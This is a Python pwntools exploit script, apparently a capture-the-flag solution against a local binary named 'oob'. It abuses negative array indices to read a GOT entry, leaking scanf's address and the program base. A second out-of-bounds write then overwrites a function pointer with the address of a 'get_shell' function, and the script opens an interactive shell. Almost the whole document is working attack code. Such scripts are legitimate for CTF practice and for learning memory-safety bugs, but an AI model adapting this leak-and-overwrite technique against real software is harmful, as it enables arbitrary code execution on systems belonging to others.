#!/bin/python
from pwn import *
exe = ELF('./oob')


p = process(exe.path)
context.terminal = ['alacritty', '-e']
gdb.attach(p, gdbscript='''

 b*main+717
          c 
           ''')
#################exploiting#####################
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Index: ', b'-5')
p.sendlineafter(b'> ', b'4')
p.recvuntil(b'Name: ')
leak_scanf_got = u64(p.recvline()[:-1]+ b'\x00\x00')
exe.address = leak_scanf_got-13744

log.info(f'leak_scanf_got: ' + hex(leak_scanf_got))
log.info(f'leak_base_exe: ' + hex(exe.address))
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Index: ', b'-9')
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'amount: ', str(exe.sym['get_shell']).encode())
p.sendlineafter(b'> ', b'2')


# p.sendlineafter(b'name: ', b'aa')










##############the end###########################
p.interactive()
